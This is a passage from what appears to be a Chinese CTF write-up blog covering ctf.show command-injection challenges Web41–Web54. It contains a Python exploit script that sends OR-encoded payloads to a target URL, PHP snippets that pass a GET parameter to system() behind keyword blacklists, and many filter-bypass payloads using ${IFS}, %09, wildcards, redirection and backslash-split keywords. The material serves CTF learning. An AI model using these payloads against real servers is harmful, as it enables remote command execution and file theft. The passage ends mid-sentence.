class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">os.system(<span class=\"string\">&quot;php rce_or.php&quot;</span>)  <span class=\"comment\">#没有将php写入环境变量需手动运行</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(argv)!=<span class=\"number\">2</span>):</span><br><span class=\"line\">   <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">50</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span>(<span class=\"string\">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">50</span>)</span><br><span class=\"line\">   exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">url=argv[<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">action</span>(<span class=\"params\">arg</span>):</span><br><span class=\"line\">   s1=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">   s2=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> arg:</span><br><span class=\"line\">       f=<span class=\"built_in\">open</span>(<span class=\"string\">&quot;rce_or.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">       <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">           t=f.readline()</span><br><span class=\"line\">           <span class=\"keyword\">if</span> t==<span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">               <span class=\"keyword\">break</span></span><br><span class=\"line\">           <span class=\"keyword\">if</span> t[<span class=\"number\">0</span>]==i:</span><br><span class=\"line\">               <span class=\"comment\">#print(i)</span></span><br><span class=\"line\">               s1+=t[<span class=\"number\">2</span>:<span class=\"number\">5</span>]</span><br><span class=\"line\">               s2+=t[<span class=\"number\">6</span>:<span class=\"number\">9</span>]</span><br><span class=\"line\">               <span class=\"keyword\">break</span></span><br><span class=\"line\">       f.close()</span><br><span class=\"line\">   output=<span class=\"string\">&quot;(\\&quot;&quot;</span>+s1+<span class=\"string\">&quot;\\&quot;|\\&quot;&quot;</span>+s2+<span class=\"string\">&quot;\\&quot;)&quot;</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span>(output)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">   param=action(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;\\n[+] your function：&quot;</span>) )+action(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;[+] your command：&quot;</span>))</span><br><span class=\"line\">   data=&#123;</span><br><span class=\"line\">       <span class=\"string\">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   r=requests.post(url,data=data)</span><br><span class=\"line\">   <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] result:\\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>\n<h1 id=\"web42\"><a class=\"markdownIt-Anchor\" href=\"#web42\">#</a> Web42：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t对于这里的，可以参考下下面这篇文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGlueXdhbi9wLzYwMjU0NjguaHRtbA==\">     Shell 脚本 ———— /dev/null 2&gt;&amp;1 详解 </span></p>\n<p>​\t\t这里如果只是想要解题的话，可以想办法让后面的不执行，或者前后分离开就行了，这里有如下几种方法：</p>\n<blockquote>\n<p>; // 分号<br>\n | // 只执行后面那条命令<br>\n || // 只执行前面那条命令<br>\n &amp; // 两条命令都会执行<br>\n &amp;&amp; // 两条命令都会执行</p>\n</blockquote>\n<h1 id=\"web43\"><a class=\"markdownIt-Anchor\" href=\"#web43\">#</a> Web43：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t对比上一题，多了一层过滤，多了一个 cat 和分号，老样子，同一个 payload：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=tac fla* ||</span><br></pre></td></tr></table></figure>\n<p>​\t\t再一次，贴一下可以绕过的方式：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=more flag.php||</span><br><span class=\"line\">?c=sort flag.php||</span><br><span class=\"line\">?c=less flag.php||</span><br><span class=\"line\">?c=tac flag.php||</span><br><span class=\"line\">?c=tail flag.php||</span><br><span class=\"line\">?c=nl flag.php||</span><br><span class=\"line\">?c=strings flag.php||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web44\"><a class=\"markdownIt-Anchor\" href=\"#web44\">#</a> Web44：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/;|cat|flag/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t多过滤了 flag，通配符绕过：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=tac f* ||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web45\"><a class=\"markdownIt-Anchor\" href=\"#web45\">#</a> Web45：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| /i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了空格，老样子，IFS 绕过：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=tac<span class=\"built_in\">$</span>&#123;IFS&#125;fla*||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web46\"><a class=\"markdownIt-Anchor\" href=\"#web46\">#</a> Web46：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了空格和星号，星号直接用问号绕过，空格使用 %09 绕过：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=tac<span class=\"comment\">%09fla?.php|| #这里的%09不属于数字</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了空格：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class=\"line\">`<span class=\"comment\">%09`(需要php环境)</span></span><br><span class=\"line\">`<span class=\"built_in\">$</span>&#123;IFS&#125;`</span><br><span class=\"line\">`<span class=\"built_in\">$</span>IFS<span class=\"built_in\">$</span>9`</span><br><span class=\"line\">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class=\"line\">`<span class=\"comment\">%20`</span></span><br><span class=\"line\">`<span class=\"comment\">%09</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"web47\"><a class=\"markdownIt-Anchor\" href=\"#web47\">#</a> Web47：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了除了 tac 以外的很大一部分读取文件的操作，flag 也被过滤了，还有空格和星号，绕过方式和上一个一样：</p>\n<blockquote>\n<p>c=tac%09fla?.php||</p>\n</blockquote>\n<h1 id=\"web48\"><a class=\"markdownIt-Anchor\" href=\"#web48\">#</a> Web48：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t不是，怎么多了这么多不认识的命令？</p>\n<p>​\t\t不过无所谓，发现还是老样子，tac、管道符和问号没有被过滤，直接无脑冲：</p>\n<blockquote>\n<p>c=tac%09fla?.php||</p>\n</blockquote>\n<h1 id=\"web49\"><a class=\"markdownIt-Anchor\" href=\"#web49\">#</a> Web49：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t没有过滤 tac，但是过滤了百分号，不过这里无伤大雅，因为 %09 不会被当作 %，所以直接</p>\n<blockquote>\n<p>?c=tac%09fla?.php||</p>\n</blockquote>\n<h1 id=\"web50\"><a class=\"markdownIt-Anchor\" href=\"#web50\">#</a> Web50：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t丸辣，过滤了 \\x09，没法过了，那就使用 &lt;&gt; 来绕过，不过，&lt;&gt; 和通配符？一起使用的时候不回显，所以用反斜杠绕过关键字 flag：</p>\n<blockquote>\n<p>?c=tac&lt;&gt;fla\\g.php||</p>\n</blockquote>\n<h1 id=\"web51\"><a class=\"markdownIt-Anchor\" href=\"#web51\">#</a> Web51：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t靠，tac 被过滤了，不过无所谓，system 函数在某些时候可以用反斜杠来分割关键字，直接一把梭：</p>\n<blockquote>\n<p>?c=ta\\c&lt;&gt;fla\\g.php||</p>\n</blockquote>\n<h1 id=\"web52\"><a class=\"markdownIt-Anchor\" href=\"#web52\">#</a> Web52：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t丸辣，这里过滤了大小于符号，不过，突然发现好像没有过滤掉 $ 符号，很好，直接 IFS 绕过。</p>\n<blockquote>\n<p>?c=ta\\c${IFS}fla\\g.php||</p>\n<p>?c=ta\\c${IFS}fl’'ag.php||</p>\n</blockquote>\n<p>​\t\t不过没有找到 flag，flag 会在哪里呢？在根目录找到了 flag。</p>\n<h1 id=\"web53\"><a class=\"markdownIt-Anchor\" href=\"#web53\">#</a> Web53：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$d</span> = <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>.<span class=\"variable\">$d</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;no&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t没啥说的，IFS 绕过一把梭：</p>\n<blockquote>\n<p>?c=ta\\c${IFS}fla\\g.php</p>\n</blockquote>\n<h1 id=\"web54\"><a class=\"markdownIt-Anchor\" href=\"#web54\">#</a> Web54：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这又是啥正则？ai 的解释如下（部分正确，不可全信）：</p>\n<blockquote>\n<p>这行代码是使用 PHP 的 <code>preg_match</code>  函数来检查一个字符串（假设为变量 <code>$c</code> ）是否包含一系列特定的模式或字符。这些模式通常与尝试绕过安全限制、注入恶意代码或执行不期望的命令有关。下面是对这个正则表达式中各个部分的解释：</p>\n<ol>\n<li><code>\\;</code> ：查找分号（ <code>;</code> ），这通常用于命令分隔，在某些情况下可能被用于尝试执行多条命令。</li>\n<li><code>.*c.*a.*t.*</code> ：查找包含 <code>cat</code>  的字符串， <code>cat</code>  是一个常用于 Unix/Linux 系统中查看文件内容的命令。</li>\n<li><code>.*f.*l.*a.*g.*</code> ：查找包含 <code>flag</code>  的字符串，这可能是在尝试获取某种 “标志” 或敏感信息。</li>\n<li><code> [0-9]</code> ：查找空格后跟任何数字，这可能是在尝试绕过基于特定字符的限制。</li>\n<li><code>\\*</code> ：查找星号（ <code>*</code> 